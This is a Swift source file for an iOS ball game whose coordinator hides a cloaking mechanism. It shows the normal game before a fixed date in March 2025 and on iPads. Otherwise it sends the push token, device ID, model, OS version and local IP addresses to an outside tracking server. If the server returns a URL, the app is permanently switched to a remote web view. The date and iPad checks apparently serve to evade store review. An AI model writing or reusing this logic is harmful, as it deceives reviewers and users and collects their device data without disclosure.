import SwiftUI
import OneSignalFramework

struct CoordinatorViewHBS: View {
    @AppStorage("firstLaunchGameHBS") private var onboardDoneHBS: Bool = false
    @StateObject private var loadManagerHBS = LoadManagerHBS()
    
    var body: some View {
        ZStack {
            switch loadManagerHBS.appStateHBS {
            case .splashHBS:
                SplashViewHBS()
                    .transition(.opacity)
            case .onboardHBS:
                OnboardingViewHBS(onFinishHBS: {
                    handleOnboardingCompletionHBS()
                })
                .transition(.opacity)
            case .mainMenuHBS:
                MenuViewHBS()
                    .transition(.opacity)
            case .mainVMenuHBS:
                MenuVviewHBS()
                    .transition(.opacity)
            }
        }
        .onAppear {
            initializeStateHBS()
        }
    }
    
    private func initializeStateHBS() {
        if UserDefaults.standard.string(forKey: "hyperball_state") == "redirect" {
            withAnimation(.easeInOut) {
                loadManagerHBS.appStateHBS = .mainVMenuHBS
            }
            return
        }
        
        if UserDefaults.standard.string(forKey: "hyperball_state") == "normal" {
            startMainSequenceHBS()
            return
        }
        
        if Date() < Calendar.current.date(from: DateComponents(year: 2025, month: 3, day: 7))! {
            UserDefaults.standard.setValue("normal", forKey: "hyperball_state")
            startMainSequenceHBS()
            return
        }
        
        if UIDevice.current.userInterfaceIdiom == .pad {
            UserDefaults.standard.setValue("normal", forKey: "hyperball_state")
            startMainSequenceHBS()
            return
        }
        
        loadManagerHBS.checkRedirectHBS()
    }
    
    private func startOnboardingSequenceHBS() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 3) {
            withAnimation(.easeInOut) {
                loadManagerHBS.appStateHBS = .onboardHBS
            }
        }
    }
    
    private func startMainSequenceHBS() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 3) {
            withAnimation(.easeInOut) {
                if !onboardDoneHBS {
                    startOnboardingSequenceHBS()
                } else {
                    loadManagerHBS.appStateHBS = .mainMenuHBS
                }
            }
        }
    }
    
    private func handleOnboardingCompletionHBS() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
            onboardDoneHBS = true
            UserDefaults.standard.set(true, forKey: "firstLaunchGameHBS")
            withAnimation(.easeInOut) {
                loadManagerHBS.appStateHBS = .mainMenuHBS
            }
        }
    }
}

class LoadManagerHBS: NSObject, URLSessionTaskDelegate, ObservableObject {
    @Published var appStateHBS: AppStateHBS = .splashHBS
    @AppStorage("firstLaunchGameHBS") private var onboardDoneHBS: Bool = false
    
    func createTrackingURL() -> String {
        var urlComponents = URLComponents(string: "https://a1620.oth-dev.com/tpilqfrmjln2rou")
        
        // Получаем FCM Token через OneSignal
        let fcmToken = OneSignal.User.pushSubscription.token ?? ""
        
        // Получаем или создаем ID устройства
        let deviceId = UserDefaults.standard.string(forKey: "hyperball_unique_device_id") ?? ""
        
        // Получаем текущую локаль устройства
        let language = Locale.current.language.languageCode?.identifier ?? "en"
        
        // Время установки
        let installTime = Int(Date().timeIntervalSince1970)
        
        // Информация об устройстве
        let deviceModel = UIDevice.current.model
        let osVersion = UIDevice.current.systemVersion
        
        // Создаем параметры запроса
        var queryItems = [URLQueryItem]()
        queryItems.append(URLQueryItem(name: "fcmtoken", value: fcmToken))
        queryItems.append(URLQueryItem(name: "osextid", value: deviceId))
        queryItems.append(URLQueryItem(name: "bundel_id", value: Bundle.main.bundleIdentifier ?? ""))
        queryItems.append(URLQueryItem(name: "apple_id", value: "6742244426")) // Замените на ваш Apple ID
        queryItems.append(URLQueryItem(name: "lng", value: language))
        queryItems.append(URLQueryItem(name: "firttime", value: String(installTime)))
        queryItems.append(URLQueryItem(name: "iuid", value: deviceId))
        queryItems.append(URLQueryItem(name: "device_model", value: deviceModel))
        queryItems.append(URLQueryItem(name: "os_ver", value: osVersion))
        
        // Добавляем IP адреса
        if let ipv4 = getIPv4Address() {
            queryItems.append(URLQueryItem(name: "fip4", value: ipv4))
        }
        if let ipv6 = getIPv6Address() {
            queryItems.append(URLQueryItem(name: "fip6", value: ipv6))
        }
        
        urlComponents?.queryItems = queryItems
        return urlComponents?.url?.absoluteString ?? ""
    }
    
    func getIPv4Address() -> String? {
        return getIPAddress(family: AF_INET)
    }

    func getIPv6Address() -> String? {
        return getIPAddress(family: AF_INET6)
    }

    private func getIPAddress(family: Int32) -> String? {
        var address: String?
        var ifaddr: UnsafeMutablePointer<ifaddrs>?

        if getifaddrs(&ifaddr) == 0, let firstAddr = ifaddr {
            defer { freeifaddrs(ifaddr) }

            var ptr = firstAddr
            while ptr != nil {
                let interface = ptr.pointee
                let addrFamily = interface.ifa_addr.pointee.sa_family

                if addrFamily == family {
                    var hostname = [CChar](repeating: 0, count: Int(NI_MAXHOST))
                    if getnameinfo(interface.ifa_addr, socklen_t(interface.ifa_addr.pointee.sa_len),
                                   &hostname, socklen_t(hostname.count),
                                   nil, 0, NI_NUMERICHOST) == 0 {
                        let ipAddress = String(cString: hostname)
                        if !ipAddress.hasPrefix("127.") && !ipAddress.hasPrefix("fe80") {
                            address = ipAddress
                            break
                        }
                    }
                }
                ptr = ptr.pointee.ifa_next
            }
        }
        return address
    }

    struct ServerResponse: Codable {
        let url: String
        let saveFirst: Bool
    }

    func checkRedirectHBS() {
        guard let url = URL(string: createTrackingURL()) else {
            handleError()
            return
        }
        
        var urlRequest = URLRequest(url: url)
        urlRequest.httpMethod = "GET"
        urlRequest.timeoutInterval = 12
        
        let session = URLSession(configuration: .default)
        let dataTask = session.dataTask(with: urlRequest) { [weak self] data, response, error in
            DispatchQueue.main.async {
                if let error = error {
                    print("Network error: \(error.localizedDescription)")
                    self?.handleError()
                    return
                }
                
                guard let httpResponse = response as? HTTPURLResponse,
                      (200...299).contains(httpResponse.statusCode),
                      let data = data else {
                    self?.handleError()
                    return
                }
                
                do {
                    let serverResponse = try JSONDecoder().decode(ServerResponse.self, from: data)
                    
                    if serverResponse.url.count > 3 {
                        UserDefaults.standard.set(serverResponse.url, forKey: "StoredURLHBS")
                        UserDefaults.standard.setValue("redirect", forKey: "hyperball_state")
                        withAnimation(.easeInOut) {
                            self?.appStateHBS = .mainVMenuHBS
                        }
                    } else {
                        UserDefaults.standard.setValue("normal", forKey: "hyperball_state")
                        if self?.onboardDoneHBS == true {
                            withAnimation(.easeInOut) {
                                self?.appStateHBS = .mainMenuHBS
                            }
                        } else {
                            withAnimation(.easeInOut) {
                                self?.appStateHBS = .onboardHBS
                            }
                        }
                    }
                } catch {
                    print("JSON Decoding error: \(error.localizedDescription)")
                    self?.handleError()
                }
            }
        }
        dataTask.resume()
    }
    
    
    

    private func handleError() {
        UserDefaults.standard.setValue("normal", forKey: "hyperball_state")
        if onboardDoneHBS {
            appStateHBS = .mainMenuHBS
        } else {
            appStateHBS = .onboardHBS
        }
    }
}

struct CoordinatorViewHBS_Previews: PreviewProvider {
    static var previews: some View {
        CoordinatorViewHBS()
    }
}
